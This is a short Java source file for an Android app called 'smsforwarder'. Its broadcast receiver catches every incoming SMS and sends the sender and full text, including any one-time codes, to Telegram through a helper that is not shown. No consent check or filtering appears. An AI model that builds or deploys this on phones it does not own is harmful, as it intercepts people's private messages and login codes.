package com.example.smsforwarder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SMSReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            String format = bundle.getString("format");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage sms;
                    try {
                        sms = SmsMessage.createFromPdu((byte[]) pdu, format);
                    } catch (Throwable t) {
                        sms = SmsMessage.createFromPdu((byte[]) pdu);
                    }
                    if (sms == null) continue;
                    String sender = sms.getDisplayOriginatingAddress();
                    String body = sms.getMessageBody();
                    String msg = "📩 Nuevo SMS recibido"
                            + "\nDe: " + sender
                            + "\nTexto: " + body;
                    Utils.sendToTelegram(msg);
                }
            }
        }
    }
}